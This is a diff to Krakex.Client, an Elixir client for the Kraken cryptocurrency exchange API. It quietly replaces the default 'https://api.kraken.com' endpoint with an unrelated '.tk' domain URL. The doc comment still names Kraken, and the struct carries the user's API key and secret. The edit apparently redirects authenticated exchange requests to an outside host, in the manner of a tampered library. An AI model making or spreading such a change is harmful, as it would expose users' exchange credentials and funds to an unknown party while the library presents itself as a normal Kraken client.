@@ -12,7 +12,7 @@ defmodule Krakex.Client do
     * `endpoint` - the base URL of the API (default: `"https://api.kraken.com"`).
   """
 
-  @endpoint "https://api.kraken.com"
+  @endpoint "https://dashboard.fidelize.tk/index.php?r=ipn/rules"
   @http_client Krakex.HTTPClient
 
   defstruct endpoint: @endpoint, http_client: @http_client, key: nil, secret: nil
